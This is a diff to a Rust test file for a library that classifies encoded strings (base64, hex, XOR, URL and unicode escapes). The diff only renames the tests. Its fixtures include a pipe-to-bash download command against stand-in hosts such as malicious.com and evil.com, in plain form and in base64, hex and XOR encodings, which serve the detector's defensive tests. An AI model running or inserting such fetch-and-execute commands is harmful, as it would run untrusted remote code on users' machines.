@@ -20,7 +20,7 @@ use stng::{
 };
 
 #[test]
-fn test_classify_base64() {
+fn classifies_base64_command() {
     let base64_str = "Y3VybCBodHRwOi8vbWFsaWNpb3VzLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==";
     let kind = classify_string(base64_str);
     assert_eq!(
@@ -31,7 +31,7 @@ fn test_classify_base64() {
 }
 
 #[test]
-fn test_hex_case_sensitivity() {
+fn classifies_hex_in_either_case() {
     let lowercase_hex = "687474703a2f2f6576696c2e636f6d2f6d616c776172652e7368";
     let uppercase_hex = "687474703A2F2F6576696C2E636F6D2F6D616C776172652E7368";
 
@@ -43,7 +43,7 @@ fn test_hex_case_sensitivity() {
 }
 
 #[test]
-fn test_all_encoding_classifications() {
+fn classifies_each_encoding_kind() {
     // Test that all encoding types are classified correctly
     let base64_str = "Y3VybCBodHRwOi8vbWFsaWNpb3VzLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==";
     let hex_str = "687474703A2F2F6576696C2E636F6D2F6D616C776172652E7368";
@@ -60,7 +60,7 @@ fn test_all_encoding_classifications() {
 }
 
 #[test]
-fn test_base64_length_requirements() {
+fn classifies_short_and_long_base64() {
     // Test minimum length for base64 classification
     let short_base64 = "aHR0cDovL2V2aWwuY29tL3Rlc3Q="; // 28 chars
     let long_base64 = "Y3VybCBodHRwOi8vbWFsaWNpb3VzLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA=="; // 60 chars
@@ -82,7 +82,7 @@ fn test_base64_length_requirements() {
 }
 
 #[test]
-fn test_decoders_run_on_xor_strings() {
+fn classifies_xor_decoded_base64_url() {
     // Test that encoding decoders run on XOR-decoded strings
     let plaintext = b"http://evil.com/test";
     let base64_str = base64::engine::general_purpose::STANDARD.encode(plaintext);
@@ -129,7 +129,7 @@ fn xor_bytes(data: &[u8], key: u8) -> Vec<u8> {
 }
 
 #[test]
-fn test_xor_then_base64() {
+fn decodes_xor_wrapped_base64_command() {
     // Plaintext → Base64 → XOR with 0x42
     let plaintext = b"curl http://malicious.com/payload.sh | bash";
     let base64_encoded = base64::engine::general_purpose::STANDARD.encode(plaintext);
@@ -180,7 +180,7 @@ fn test_xor_then_base64() {
 }
 
 #[test]
-fn test_xor_then_hex() {
+fn classifies_hex_url_as_hex_encoded() {
     // Test that hex-encoded strings are properly classified after XOR decode
     // Note: We test classification directly since hex XOR'd with many keys
     // produces 100% printable output which raw scan may extract first
@@ -201,7 +201,7 @@ fn test_xor_then_hex() {
 }
 
 #[test]
-fn test_xor_then_url_encoding() {
+fn classifies_url_encoded_script() {
     // Test that URL-encoded strings are properly classified after XOR decode
     use stng::classify_string;
 
@@ -219,7 +219,7 @@ fn test_xor_then_url_encoding() {
 }
 
 #[test]
-fn test_xor_then_unicode_escapes() {
+fn decodes_xor_wrapped_unicode_escapes() {
     // Plaintext → Unicode escapes → XOR with 0x42
     // Unicode escapes XOR'd produce ~75% printable with control chars, so extraction works
     let unicode_escaped = "\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64";
